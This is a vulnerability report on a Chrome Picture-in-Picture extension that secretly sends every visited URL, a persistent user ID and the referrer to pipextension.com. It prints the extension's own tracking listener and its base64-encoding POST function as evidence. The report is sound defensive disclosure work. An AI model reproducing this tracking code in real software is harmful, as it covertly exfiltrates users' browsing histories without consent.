# Vulnerability Report: Picture in Picture for Videos

## Metadata
- **Extension ID**: pmdjjeplkafhkdjebfaoaljknbmilfgo
- **Extension Name**: Picture in Picture for Videos
- **Version**: 1.2
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

This extension presents itself as a simple Picture-in-Picture video player utility, but contains undisclosed browsing history collection functionality. The extension secretly transmits every page URL the user visits to a remote server (pipextension.com) along with a persistent user identifier and referrer information. This behavior is not disclosed in the extension's description and goes far beyond what is necessary for Picture-in-Picture functionality.

The extension monitors all tab navigation events across all websites (using `<all_urls>` permission) and sends detailed browsing data including URLs, user ID, and referrer chains to an external analytics endpoint. This constitutes undisclosed user tracking and data exfiltration.

## Vulnerability Details

### 1. HIGH: Undisclosed Browsing History Exfiltration

**Severity**: HIGH

**Files**: bg.js

**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The background service worker (bg.js) implements a comprehensive browsing history tracking system that monitors every page navigation event and transmits this data to `pipextension.com/api/reports`. The extension:

1. Generates a persistent user identifier (UUID) stored in local storage
2. Monitors all tab navigation events via `chrome.tabs.onUpdated`
3. Collects URL, user ID, and referrer information for each page visit
4. Transmits this data (base64-encoded JSON) to the remote server via POST request
5. Maintains a session-based referrer chain to track navigation paths

**Evidence**:

```javascript
chrome.tabs.onUpdated.addListener((async (e, t, a) => {
  if ("complete" === t.status) {
    handleRuntimeError();
    const t = await getFromChromeLocalStorage("uid"),
      r = await tabInfo(e);
    let o = r?.url;
    if (isValidPage(a.url) && a.url !== o) {
      let r = {
        uri: a.url,
        uid: t,
        docref: o
      };
      await postData("https://pipextension.com/api/reports", r);
      let s = await getFromSessionStorage("ferers") || {};
      s[e] = {
        url: a.url
      }, await setToSessionStorage("ferers", s)
    }
  }
}))
```

The `postData` function base64-encodes the browsing data before transmission:

```javascript
postData = async (e, t = {}) => {
  try {
    const a = JSON.stringify(t),
      r = btoa(a),  // Base64 encode
      o = await fetch(e, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "text/plain"
        },
        body: r
      });
    return await o.json()
  } catch (e) {}
};
```

**Verdict**: This is a clear privacy violation. The extension collects complete browsing history across all websites and associates it with a persistent user identifier, all without proper disclosure. The Picture-in-Picture functionality does not require monitoring navigation events or tracking user browsing patterns. This data collection is excessive and undisclosed.

### 2. MEDIUM: Referrer Chain Tracking

**Severity**: MEDIUM (informational - part of the main HIGH issue)

**Files**: bg.js, pip.js

**Description**: The extension maintains a session-based referrer chain that tracks how users navigate between pages. The content script (pip.js) also sends location and referrer data via runtime messages:

```javascript
chrome.runtime.sendMessage({ "message": "siteref", "location": window.location.href, "siteref" : document.referrer })
```

While this message is not explicitly handled in the background script shown, it demonstrates the extension's focus on tracking navigation patterns beyond its stated functionality.

## False Positives Analysis

The Picture-in-Picture functionality itself (in pip.js) is legitimate:
- Finding the largest playing video element on the page
- Requesting Picture-in-Picture mode via native browser API
- Managing PiP state and UI updates
- Using ResizeObserver to track video element changes

These features are appropriate for a PiP extension. However, none of these features require collecting or transmitting browsing history data.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| pipextension.com/api/reports | Browsing history collection | URL, persistent user ID, referrer | HIGH - undisclosed tracking |
| pipextension.com/#how-it-works | Post-install redirect | None | LOW - promotional |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**:
This extension implements undisclosed browsing history collection that violates user privacy expectations. While the core Picture-in-Picture functionality is legitimate, the extension secretly monitors and transmits every page URL the user visits to a remote server, along with a persistent tracking identifier and referrer information.

Key concerns:
1. **Undisclosed data collection** - No mention of browsing history tracking in the extension description
2. **Excessive permissions abuse** - Uses `<all_urls>` to monitor all page navigation, not just video pages
3. **Persistent tracking** - Generates and stores a UUID to track users across sessions
4. **Privacy violation** - Complete browsing history is valuable personal data being exfiltrated without consent
5. **Deceptive practices** - Legitimate functionality (PiP) is used as cover for data collection

The extension does not appear to be malware (no credential theft, no code injection attacks), but the undisclosed data collection practices are a serious privacy violation that warrants a HIGH risk rating. This behavior should be disclosed in the privacy policy and extension description, and users should be given the option to opt out of analytics while still using the core PiP functionality.
